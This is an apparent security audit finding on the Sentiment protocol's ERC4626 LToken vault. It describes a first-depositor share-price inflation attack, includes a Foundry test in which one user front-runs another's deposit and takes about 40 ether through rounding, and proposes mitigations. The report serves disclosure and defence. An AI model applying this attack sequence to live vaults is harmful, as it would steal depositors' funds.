cergyk
# First user can steal part of everyone else's tokens

https://github.com/sentimentxyz/protocol/blob/main/src/tokens/utils/ERC4626.sol#L48
## [H] First user can steal part of everyone else's tokens
### Problem
A user who deposits to LToken vault first can steal part of everybody's tokens by sending tokens to the system externally.
They can manipulate the price of a share.
This attack is possible because you enable depositing a small amount of tokens.
### Proof of Concept
Here is simple test that shows the flow, it is not the exploit (can make it on hardhat, just a lot of setup required)
```solidity
pragma solidity 0.8.15;

import {TestBase} from "../utils/TestBase.sol";
import "forge-std/console.sol";

contract ProtocolTest is TestBase {
    address public alice = cheats.addr(1);
    address public bob = cheats.addr(2);

    function setUp() public {
        setupContracts();
    }

    function testTakeBobsMoney() public {
        erc20.mint(address(alice), 1000 ether);
        erc20.mint(address(bob), 1000 ether);
        cheats.prank(alice);
        erc20.approve(address(lErc20), type(uint256).max);
        cheats.prank(bob);
        erc20.approve(address(lErc20), type(uint256).max);

        cheats.startPrank(alice);
        lErc20.deposit(1, alice); // 1 share costs 1 wei now
        assertEq(lErc20.previewRedeem(1), 1);
        // alice 's bot monitors mempool

        assertEq(lErc20.previewDeposit(180 ether), 180 ether); //Bob checks that he will get 180 ether shares for his 180 ether
        // when bob deposits funds alice's bot puts transaction with higher priority  
        erc20.transfer(address(lErc20), 100 ether); // 1 share costs 100 ether + 1 wei now
        cheats.stopPrank();

        assertEq(lErc20.previewRedeem(1), (100 ether + 1));
       
        cheats.prank(bob);
        lErc20.deposit(180 ether, bob); // 2 shares cost 200 ether + 2 wei, so Bob gets only one share, because of rounding down

        assertEq(lErc20.previewRedeem(1), 140 ether); // now we have ~280 ether in the vault, 140 ether per share
        
        cheats.prank(alice);
        lErc20.redeem(1, alice, alice);

        uint aliceBalance = erc20.balanceOf(address(alice));
        assertEq(aliceBalance, (1040 ether - 1)); // alice got +~40 ether at the expense of bob
    }
}
```

### Mitigation
- Use Flashbots to avoid mempool.
- Force users to deposit at least some amount in the LToken vault.
That way the amount the attacker will need to ERC20.transfer to the system will be at least X * 1e18 instead of X which is unrealistic.
An alternative is to require only the first depositor to freeze big enough initial amount of liquidity. This approach has been used long enough by various projects, for example in Uniswap V2:
[Uniswap/UniswapV2Pair.sol#L119-L121](https://github.com/Uniswap/v2-core/blob/master/contracts/UniswapV2Pair.sol#L119-L121)
